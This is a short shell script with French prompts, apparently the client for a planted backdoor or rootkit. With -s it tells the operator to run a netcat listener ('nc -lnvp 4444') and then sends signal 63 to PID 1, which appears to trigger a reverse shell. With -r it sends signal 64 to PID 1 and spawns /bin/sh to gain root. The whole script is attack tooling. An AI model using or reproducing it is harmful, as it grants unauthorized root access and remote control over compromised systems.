#!/bin/sh

message="Compagnon usage:\n-s\tObtenir un reverse shell\n-r\tObtenir un shell en root\n"

if [ -z "$1" ]; then
	echo "${message}"
else
	if [ $1 = "-s" ]; then
		echo "Sur la machine hôte exécutez cette commande : 'nc -lnvp 4444' puis appuyez sur ENTREE"
		read REPLY
		kill -63 1
	elif [ $1 = "-r" ]; then
		kill -64 1
		/bin/sh
	else
		echo "${message}"
	fi
fi
